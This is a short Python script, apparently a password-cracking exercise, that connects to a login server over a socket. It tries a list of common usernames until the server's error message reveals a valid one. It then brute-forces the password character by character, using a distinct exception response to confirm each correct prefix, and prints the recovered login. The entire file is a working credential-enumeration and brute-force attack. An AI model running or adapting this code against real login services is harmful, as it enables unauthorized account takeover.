import socket
import json
import sys

abc = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

logins_list = [
    'admin', 'Admin', 'admin1', 'admin2', 'admin3',
    'user1', 'user2', 'root', 'default', 'new_user',
    'some_user', 'new_admin', 'administrator',
    'Administrator', 'superuser', 'super', 'su', 'alex',
    'suser', 'rootuser', 'adminadmin', 'useruser',
    'superadmin', 'username', 'username1'
]


def login_generator():
    for login in logins_list:
        yield login


with socket.socket() as ssocket:

    args = sys.argv                             # list of arguments from command line
    address_and_port = (args[1], int(args[2]))
    ssocket.connect(address_and_port)
    srecv = ""
    good_pass = ""

    for login_gen in login_generator():     # first check for username vulnerability.
        json_message = '{ "login" : "' + login_gen + '", "password" : " " }'

        ssocket.send(json_message.encode('utf8'))
        srecv = ssocket.recv(1024).decode('utf8')
        
        if json.loads(srecv)["result"] == "Wrong password!":
            break

    for _ in range(10):     # bruteforce for password after username solved
        for char in abc:
            json_message = '{ "login" : "' + login_gen + '", "password" : "' + good_pass + char + '" }'

            ssocket.send(json_message.encode('utf8'))
            srecv = ssocket.recv(1024).decode('utf8')

            if json.loads(srecv)["result"] == "Exception happened during login":
                good_pass += char

            if json.loads(srecv)["result"] == "Connection success!":
                print('{"login": "' + login_gen + '", "password": "' + good_pass + char + '"}')
                exit()
